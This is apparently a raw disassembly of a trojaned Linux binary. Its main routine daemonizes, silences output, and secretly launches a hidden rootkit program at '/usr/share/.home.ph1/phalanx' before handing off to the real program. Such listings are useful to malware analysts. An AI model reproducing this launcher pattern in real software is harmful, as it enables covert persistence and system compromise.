xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push fcn.080485a1
push fcn.08048550
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
jmp dword [reloc.execl]
jmp dword [reloc.close]
jmp dword [reloc.fork]
jmp dword [reloc.execve]
jmp dword [reloc.setsid]
jmp dword [reloc.exit]
jmp dword [reloc.sprintf]
push ebp
mov ebp, esp
sub esp, 0x58
and esp, 0xfffffff0
mov eax, 0
add eax, 0xf
add eax, 0xf
shr eax, 4
shl eax, 4
sub esp, eax
mov dword [var_8h], str..ph1
mov dword [format], str._bin_host_s
lea eax, [s]
mov dword [esp], eax
call sym.imp.sprintf
call sym.imp.fork
test eax, eax
jne 0x8048532
call sym.imp.fork
test eax, eax
jne 0x8048526
call sym.imp.setsid
mov dword [esp], 1
call sym.imp.close
mov dword [esp], 2
call sym.imp.close
mov dword [var_ch], 0
mov dword [var_8h], 0x8048651
mov dword [format], str.phalanx
mov dword [esp], str._usr_share_.home.ph1_phalanx
call sym.imp.execl
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [argv]
mov dword [var_8h], eax
mov eax, dword [envp]
mov dword [format], eax
lea eax, [s]
mov dword [esp], eax
call sym.imp.execve
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.08048444
add ebx, 0x1333
sub esp, 4
mov eax, dword [ebx - 4]
test eax, eax
je 0x804843e
call eax
add esp, 4
pop ebx
pop ebp
ret
mov ebx, dword [esp]
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [section..jcr]
test eax, eax
je 0x8048498
mov eax, 0
test eax, eax
je 0x8048498
mov dword [esp], section..jcr
call eax
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov eax, dword [segment.LOAD1]
cmp eax, 0xffffffff
je 0x804860f
mov ebx, segment.LOAD1
call eax
mov eax, dword [ebx - 4]
sub ebx, 4
cmp eax, 0xffffffff
jne 0x8048602
add esp, 4
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
call fcn.08048420
call fcn.08048477
call fcn.080485ec
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.08048444
add ebx, 0x113b
sub esp, 4
call fcn.08048448
add esp, 4
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
cmp byte [section..bss], 0
je 0x8048463
jmp 0x8048475
add eax, 4
mov dword [0x8049790], eax
call edx
mov eax, dword [0x8049790]
mov edx, dword [eax]
test edx, edx
jne 0x8048459
mov byte [section..bss], 1
leave
ret
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
call fcn.08048444
add ebx, 0x11ff
sub esp, 0xc
call fcn.08048354
lea eax, [ebx - 0xe0]
lea edx, [ebx - 0xe0]
mov dword [var_10h], eax
sub eax, edx
sar eax, 2
cmp esi, eax
jae 0x8048599
mov edi, edx
call dword [edx + esi*4]
mov eax, dword [var_10h]
add esi, 1
sub eax, edi
mov edx, edi
sar eax, 2
cmp esi, eax
jb 0x8048585
add esp, 0xc
pop ebx
pop esi
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
call fcn.08048444
add ebx, 0x11ad
mov dword [var_8h], esi
mov dword [var_4h], edi
lea esi, [ebx - 0xe0]
lea edi, [ebx - 0xe0]
sub esi, edi
sar esi, 2
jmp 0x80485d1
call dword [edi + esi*4]
sub esi, 1
cmp esi, 0xffffffff
jne 0x80485ce
call fcn.08048618
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov esp, ebp
pop ebp
ret
